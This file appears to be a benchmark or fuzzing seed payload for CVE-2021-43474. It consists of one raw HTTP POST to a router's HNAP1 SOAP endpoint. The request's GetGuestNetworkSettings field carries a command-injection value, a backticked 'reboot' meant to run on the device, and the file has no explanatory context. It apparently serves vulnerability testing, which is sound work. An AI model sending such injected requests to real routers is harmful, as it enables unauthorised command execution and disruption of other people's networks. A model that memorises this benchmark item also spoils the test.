Vulnerabilities/CVE-2021-43474/BM-2024-00002-payload.seed2

POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/GetGuestNetworkSettings"
HNAP_AUTH: 183F4531CC823E205D53A1F2221EFAA7 1599641600
X-Requested-With: XMLHttpRequest
Content-Length: 366
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/DhcpServer.html
Cookie: uid=OjYxBrjCNp; PrivateKey=5D7864723F6D261E02095D964FA05B5C; timeout=0

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <soap:Body>
    <GetGuestNetworkSettings xmlns="http://purenetworks.com/HNAP1/">'`reboot`'</GetGuestNetworkSettings>
  </soap:Body>
</soap:Envelope>
